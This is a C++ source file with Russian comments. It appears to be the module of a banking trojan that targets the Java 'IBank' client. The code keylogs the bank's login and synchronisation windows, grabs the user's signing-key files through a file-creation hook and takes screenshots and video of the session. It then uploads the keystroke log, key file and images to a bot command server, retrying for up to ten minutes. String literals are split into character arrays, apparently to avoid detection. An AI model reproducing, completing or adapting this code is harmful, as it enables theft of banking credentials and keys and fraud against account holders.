//---------------------------------------------------------------------------


#pragma hdrstop

#include <windows.h>

#include "IBankSystem.h"
#include "UniversalKeyLogger.h"
#include "FileGrabber.h"
#include "Strings.h"
#include "Config.h"
#include "GetApi.h"
#include "Memory.h"
#include "Splice.h"
#include "ScreenShots.h"
#include "Utils.h"
#include "BotClasses.h"
#include "BotHTTP.h"
#include "Loader.h"
//#include "IBankExport.h"
#include "FileGrabber.h"
#include "Utils.h"
#include "VideoRecorder.h"

#include "Modules.h"


//---------------------------------------------------------------------------

#include "BotDebug.h"

namespace IBANKDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// Объявляем шаблон вывода отладочных строк
#define IBDBG IBANKDEBUGSTRINGS::DBGOutMessage<>
//---------------------------------------------------------------------------


#ifdef JavaConfigH
	char IBankLogPath[] = {'/', 'b', 'o', 't', 'g', 'r', 'a', 'b', 'b', 'e', 'r', '.', 'p', 'h', 'p',  0};
#else
	char IBankLogPath[] = {'/', 'g', 'e', 't', '/', 'i', 'b', 'a', 'n', 'k', '.', 'h', 't', 'm', 'l',  0};
#endif


namespace IBank
{

	char SystemName[]   = {'I', 'B', 'A', 'N', 'K',  0};

	//-----------------------------------------------------------------------
	typedef struct TIBankLog
	{
		DWORD     PID;              // Идентификатор проуесса
		HWND      Wnd;              // Главное окно системы
		PCHAR     SystemName;       // Имя системы
		PCHAR     KeyFile;          // Имя файла ключа
        PCHAR     Log;              // Текстовый лог
		TMemBlock StartScreenShot;  // Скриншот созданный при старте системы
		TMemBlock EndScreenShot;    // Скриншот созданный при закрытии системы
		PCHAR     LogFile;          // Имя файла лога
	} *PIBankLog;

	//-----------------------------------------------------------------------


	// Определяем типы для установки хуков
	typedef int (WINAPI *PConnect)(SOCKET s, const struct sockaddr *name, int namelen);

	// Переменные для хранения казателей на реальные функции
	PConnect Real_Connect;

    // Глобальные переменные системы
	PKeyLogSystem System = NULL;
	bool Hooked = false;

	TIBankLog Log;

	DWORD KeyFileNameHash = 0;
	bool recVideoIsRun = false; //запущен ли процесс записи видео

	//-----------------------------------------------------------------------

	void SendIBankLog();

	//-----------------------------------------------------------------------

	//создает имя файла которое будет одинаковым для всех процессов, в имени файла  используется пид процесса, для которого он предназначен
	PCHAR GetNameForKeyFile(DWORD pid)
	{
		PCHAR path = (PCHAR) HEAP::Alloc(MAX_PATH);
		if( path )
		{
			pGetTempPathA( MAX_PATH, path );
			char buf[32];
			fwsprintfA pwsprintfA = Get_wsprintfA();
			pwsprintfA( buf, "pid_%d", pid );
			pPathAppendA( path, buf );
			char* path2 = UIDCrypt::CryptFileName( path, true );
			IBDBG( "IBANK", "Файл ключа: %s -> %s", path, path2 );
			HEAP::Free(path);
			path = path2;
		}
		return path;
	}

	void SetKeyFile(PWCHAR FileName)
	{
		// Устанавливаем файл ключа
		if (Log.KeyFile != NULL)
			STR::Free2(Log.KeyFile);

		KeyFileNameHash = CalcHashW(FileName);
		Log.KeyFile = WSTR::ToAnsi(FileName, 0);
		IBDBG("IBank", "Обнаружен файл ключа %s", Log.KeyFile);
    }

	//-----------------------------------------------------------------------

	//true - если файл является файлом ключем, а также отсылает его в админку
	int IsFileKeyJava( FileGrabber::ParamEvent* e )
	{
		if( e->unicode )
			SetKeyFile((PWCHAR)e->fileNameW);
		return 0;
	}

	int IsFileKeyJavaW( FileGrabber::ParamEvent* e )
	{
		if( e->unicode )
		{
			//сохраняем имя файла в специальном файле
			char* nameFile = GetNameForKeyFile( GetParentPID() );
			int len = m_wcslen(e->fileNameW);
			File::WriteBufferA( nameFile, (LPVOID)e->fileNameW, (len + 1) * sizeof(WCHAR) ); //сохраняем вместе с завершающим нулем
			STR::Free(nameFile);
			IBDBG("IBankW", "Обнаружен файл ключа %ls", e->fileNameW);
		}
		return 0;
	}

	//-----------------------------------------------------------------------


	int WINAPI Hook_Connect( SOCKET s, const struct sockaddr *name, int namelen )
	{
		// Идёт запрос на сервер, закрываем систему.
		KeyLogger::CloseSession();

    	return Real_Connect(s, name, namelen);
    }
	//-----------------------------------------------------------------------

	void MakeScreenShot()
	{
    	IBDBG("IBank", "Делаем снимок экрана");
		ScreenShot::MakeToMem(NULL, 0, 0, 0, 0, NULL, (LPBYTE &)Log.StartScreenShot.Data, Log.StartScreenShot.Size);
	}
	//-----------------------------------------------------------------------

   /*	static void WINAPI ShowWindowIBank(PKeyLogger Logger, DWORD EventID, LPVOID Data)
	{

		TShowWindowData* data = (TShowWindowData*)Data;

		// Скрытие окон игнорируем
		if (data->Command == 0)
			return;

		char caption[128];
		pGetWindowTextA( data->Window, caption, sizeof(caption) );

		if(m_strstr(caption, "Вход в систему") == 0)
		{
			char PatTxt[MAX_PATH];
			if(	GetAllUsersProfile(PatTxt, MAX_PATH, "Pat.txt"))
			{
				File::WriteBufferA(PatTxt, (LPVOID)"1", 1);
                VideoRecorderSrv::StartRecording(SystemName);
			}
		}
	}  */
	//------------------------------------------------------------------------


	void SetHooks()
	{
		// Устанавливаем треуемые хуки
		IBDBG( "IBank", "Ставим хуки для %s", System->Name );

		// Ставим хук на подключение к серверу, для определения момента закрыти
		// системы
		if ( HookApi( 4, 0xedd8fe8a, &Hook_Connect ) )
		{
			__asm mov [Real_Connect], eax
		}

		//KeyLogger::ConnectEventHandler( KLE_SHOW_WND, ShowWindowIBank );
    }

	void AddFileGrabber(FileGrabber::TypeFuncReceiver IsFileKey)
	{
		FileGrabber::Init(FileGrabber::CREATEFILEW);
		FileGrabber::Receiver* rv = FileGrabber::CreateReceiver();
		rv->FuncReceiver = IsFileKey;
		rv->minSize = 500;
		rv->maxSize = 3000;
		rv->aw |= FileGrabber::FILEISBIN;
		const char pkFormat[] = { 'P', 'K', 0 };
		FileGrabber::AddIgnoreBeg( rv, pkFormat ); //игнорируем zip (jar) архив
		FileGrabber::AddReceiver(rv);
	}


	//-----------------------------------------------------------------------
	void SystemActivated(LPVOID Sender)
	{
		System = (PKeyLogSystem)Sender;
		// Активированы система IBank
		IBDBG("IBank", "Система %s активирована, %08x", System->Name, (DWORD)GetImageBase() );

		// Сигнализируем ява патчеру о необходимости запуска патчей
		#ifdef JAVS_PATCHERH
			JavaPatcherSignal();
		#endif

		// Запускаем запись видео
		VideoRecorderSrv::StartRecording(SystemName);

		// Инициализируем данные системы
		PKeyLogger Logger = KeyLogger::GetKeyLogger();

		Log.PID     = Logger->PID;
		Log.LogFile = STR::New(Logger->FileName);

		// Определяем основное окно
		Log.Wnd = Logger->ActiveWND;
		HWND Temp = Log.Wnd;
		while (Temp != NULL)
		{
			Temp = (HWND)pGetParent(Temp);
			if (Temp != NULL)
            	Log.Wnd = Temp;
		}

		//  Ставим хуки
		if( !Hooked ) 
		{
			SetHooks();
			Hooked = true;
		}
	}


	void SystemActivated2(LPVOID Sender)
	{
		IBDBG("IBank", "граббер для оффлайн версии активирован");
		AddFileGrabber(IsFileKeyJava);
	}

	void SystemActivatedW(LPVOID Sender)
	{
		System = (PKeyLogSystem)Sender;
		AddFileGrabber(IsFileKeyJavaW);
	}

	//-----------------------------------------------------------------------

	void SystemDeactivated(LPVOID Sender)
	{
		if (System == NULL)
			return;

		IBDBG("IBank", "Система %s закрыта", System->Name);
		FileGrabber::Release();

		//читаем имя файла ключа записанного в другом процессе
		char* nameFile = GetNameForKeyFile( GetUniquePID() );
		if( nameFile )
		{
			DWORD sz;
			//считываем имя файла ключа
			PWCHAR fileKey = (PWCHAR)File::ReadToBufferA( nameFile, sz );
			if( fileKey )
			{
				if( fileKey[0] ) 
				{
					SetKeyFile(fileKey);
				}
				MemFree(fileKey);
			}
		}

		// Создаём скриншот окна авторизации
		ScreenShot::MakeToMem(Log.Wnd, 0, 0, 0, 0, NULL, (LPBYTE &)Log.EndScreenShot.Data, Log.EndScreenShot.Size);

		System = NULL;

		// Отправляем лог
        SendIBankLog();

		// Освобождаем данные
		STR::Free2(Log.LogFile);

		if (Log.EndScreenShot.Data != NULL)
		{
			MemFree(Log.EndScreenShot.Data);
			ClearStruct(Log.EndScreenShot);
		}
		
		if( nameFile )
		{
			pDeleteFileA(nameFile); //удаляем файл с именем ключа
			STR::Free(nameFile);
		}
	}

	void SystemDeactivated2(LPVOID Sender)
	{
		FileGrabber::Release();
		IBDBG("IBankW", "Закрыт" );
	}

	//-----------------------------------------------------------------------

	bool SendLog(PCHAR URL, PIBankLog Log)
	{
		// Отправляем лог системы
		if (STR::IsEmpty(URL) || Log == NULL)
			return false;

        PCHAR UID = GenerateBotID();

		// Заполняем массив данных
		PMultiPartData Data = MultiPartData::Create();


		IBDBG("IBank", "----------- Key:%s<key_end>",  Log->Log);

		MultiPartData::AddStringField(Data, "uid",  UID);
		MultiPartData::AddStringField(Data, "keyhwnd",  Log->Log);
		MultiPartData::AddLongAsStr(Data,   "pid",  Log->PID);
		MultiPartData::AddLongAsStr(Data,   "hwnd", (DWORD)Log->Wnd);


		if (Log->KeyFile != NULL)
        	MultiPartData::AddFileField(Data, "keyfile", Log->KeyFile, NULL);

		if (Log->StartScreenShot.Data != NULL)
		{
			MultiPartData::AddBlobAsFile(Data, "windscreen", "SS_1.png", NULL, (LPBYTE)Log->StartScreenShot.Data, Log->StartScreenShot.Size);
		    //File::WriteBufferA("c:\\SS_1.png", Log->StartScreenShot.Data, Log->StartScreenShot.Size);
        }

		if (Log->EndScreenShot.Data != NULL)
		{
			MultiPartData::AddBlobAsFile(Data, "procscreen", "SS_2.png", NULL, (LPBYTE)Log->EndScreenShot.Data, Log->EndScreenShot.Size);
		   //File::WriteBufferA("c:\\SS_2.png", (LPBYTE)Log->EndScreenShot.Data, Log->EndScreenShot.Size);
        }

		// Отправляем запрос

		THTTPResponse Response;
    	ClearStruct(Response);

        PCHAR Buf = NULL;


		bool Result = HTTP::Post(URL, Data, &Buf, &Response);


		if (Result)
			Result = CheckValidPostResult(&Response, NULL);

		// Освобождаем данные
		MultiPartData::Free(Data);
		STR::Free(UID);
		HTTPResponse::Clear(&Response);
		STR::Free(Buf);

		return Result;

	}
	//-----------------------------------------------------------------------

	PCHAR inline GetIBankURL()
	{
		// Функция возвращает адрес скрипта для отправки лога
		#ifdef JavaConfigH
			return GetJavaScriptURL(IBankLogPath);
		#else
			return GetBotScriptURL(0, IBankLogPath);
		#endif
    }

	//-----------------------------------------------------------------------

	DWORD WINAPI SenderProc(LPVOID Data)
	{
		// Отправляем отчёт

		PIBankLog L = (PIBankLog)Data;
		if (L == NULL)
			return 0;


		for (int i = 1; i <= 10; i++)
		{
			PCHAR URL = GetIBankURL();

		    IBDBG("IBank", "Отправляем лог. (Попытка %d) URL - %s", i, URL);

			if (URL != NULL)
			{
				if (SendLog(URL, L))
				{
					IBDBG("IBank", "Лог успешно отправлен");
					STR::Free(URL);
					break;
				}
			}

            STR::Free(URL);

			pSleep(60000);

		}

        // Уничтожаем данные
		MemFree(L->EndScreenShot.Data);
		STR::Free(L->LogFile);
		STR::Free(L->Log);

		pDeleteFileA(L->LogFile);

		FreeStruct(L);

		return 0;

    }


	void SendIBankLog()
	{
		// Запускаем отправку данных
		PIBankLog L = CreateStruct(TIBankLog);

		// Копируем данные
		m_memcpy(L, &Log, sizeof(Log));


		L->Log = KLGPacker::GetTextDataFromFile(Log.LogFile);

		// Для отладки сохраним сохраним копию пустого лога на диск
//		#ifdef DEBUGCONFIG
//			if (!FileExistsA(Log.LogFile))
//            	MessageBoxA(NULL, "Файл отсутствует", NULL, 0);
//			if (STR::IsEmpty(L->Log))
//				pCopyFileA(Log.LogFile, "c:\\IBankLog.Log", false);
//		#endif


		// Очищаем данные, которые относятся к рамкам текущей сессии
		Log.LogFile = NULL;
		ClearStruct(Log.EndScreenShot);

		// Запускаем поток
		StartThread(SenderProc, L);
    }

#ifdef IBankExportH

BOOL WINAPI Hook_WriteFile( HANDLE hFile, LPCVOID lpBuffer,	DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped )
{
	if( SExpWriteFile( hFile, lpBuffer, nNumberOfBytesToWrite ) ) //данные переданы на анализ, говорим что запись успешна
	{
		if( lpNumberOfBytesWritten )
			*lpNumberOfBytesWritten = nNumberOfBytesToWrite;
		return TRUE;
	}
	return Real_WriteFile( hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped );
}

BOOL WINAPI Hook_CloseHandle( HANDLE hObject )
{
	SExpCloseHandle(hObject);
	return Real_CloseHandle(hObject);
}

#endif

}


//---------------------------------------------------------------------------

#ifdef AGENTFULLTEST
	void ___RegisterIBankSystem(DWORD hashApp)
	{

		// Тестовая регистрация

		ClearStruct(IBank::Log);
		IBank::Hooked = false;
		IBank::System = NULL;

		// Функция регистрирует систему IBANK
		char SysName[]   = {'I', 'B', 'A', 'N', 'K',  0};
		char SysNameW[]  = {'I', 'B', 'A', 'N', 'K', 'W', 0};
		char Caption1[]  = {'*', 'в', 'х', 'о', 'д', '*',  0};;
		char Caption2[]  = {'*', 'в', 'х', '*', 'д', '*',  0};
		char Caption3[]  = {'*','и','н','х','р','о','н','и','з','а','ц','и','я','*', 0}; //Синхронизация с банком



		PKeyLogSystem S = KeyLogger::AddSystem(SysName, 0);

		if (S != NULL)
		{
			IBDBG("IBank", "Система зарегистрирована");
			IBank::System = S;
			S->OnActivate      = IBank::SystemActivated;
			S->OnDeactivate    = IBank::SystemDeactivated;
			S->DontSendLog     = true;
			S->TimeMode		   = KLG_TIME_INFINITE;

			IBank::MakeScreenShot();

			// Добавляем фильтры окон
			PKlgWndFilter F;
			F = KeyLogger::AddFilter(S, true, true, NULL, Caption1, FILTRATE_PARENT_WND, LOG_ALL, 3);
			if (F != NULL)
			{
				F->CaseSensetive = false;
				F->DontSaveMouseLog = true;
				KeyLogger::AddFilterText(F, NULL, Caption2);
				KeyLogger::AddFilterText(F, NULL, Caption3);
			}

		}
	}
#endif


void RegisterIBankSystem(DWORD hashApp)
{


	// Для тестов
	#ifdef AGENTFULLTEST
		___RegisterIBankSystem(0);
		return;
	#endif




	ClearStruct(IBank::Log);
	IBank::Hooked = false;
	IBank::System = NULL;

	// Функция регистрирует систему IBANK

	char SysNameW[]  = {'I', 'B', 'A', 'N', 'K', 'W', 0};
	char ClassName[] = {'S','u','n','A','w','t','F','r','a','m','e', 0};;
	char Caption1[]  = {'*', 'в', 'х', 'о', 'д', '*',  0};;
	char Caption2[]  = {'*', 'в', 'х', '*', 'д', '*',  0};
	char Caption3[]  = {'*','и','н','х','р','о','н','и','з','а','ц','и','я','*', 0}; //Синхронизация с банком


	DWORD hashMain = PROCESS_HASH_JAVA;
	//если javaw.exe запущен не из под java.exe, то возможно это оффлайн версия ибанка
	if( hashApp == PROCESS_HASH_JAVAW && GetHashForPid(GetParentPID()) != PROCESS_HASH_JAVA )
		hashMain = PROCESS_HASH_JAVAW;

	PKeyLogSystem S = KeyLogger::AddSystem(IBank::SystemName, hashMain);

	if (S != NULL)
	{
		IBDBG("IBank", "Система зарегистрирована");
		IBank::System = S;
		S->OnActivate      = IBank::SystemActivated;
		S->OnDeactivate    = IBank::SystemDeactivated;
		S->DontSendLog     = true;
		S->TimeMode		   = KLG_TIME_INFINITE;

		IBank::MakeScreenShot();

		// Добавляем фильтры окон
		PKlgWndFilter F;
		F = KeyLogger::AddFilter(S, true, true, ClassName, Caption1, FILTRATE_PARENT_WND, LOG_ALL, 3);
		if (F != NULL)
		{
			F->CaseSensetive = false;
			F->DontSaveMouseLog = true;
			KeyLogger::AddFilterText(F, NULL, Caption2);
			KeyLogger::AddFilterText(F, NULL, Caption3);
		}

		if( hashMain == PROCESS_HASH_JAVAW ) //граббер ключей для оффлайн версии
			S->OnProcessRun = IBank::SystemActivated2;
	}

	if( hashMain != PROCESS_HASH_JAVAW ) //не онлайн версия
	{
		S = KeyLogger::AddSystem(SysNameW, PROCESS_HASH_JAVAW);
		if( S!= NULL )
		{
			IBDBG("IBankW", "Система зарегистрирована");
			IBank::System = S;
			S->OnProcessRun = IBank::SystemActivatedW;
		}
	}
}
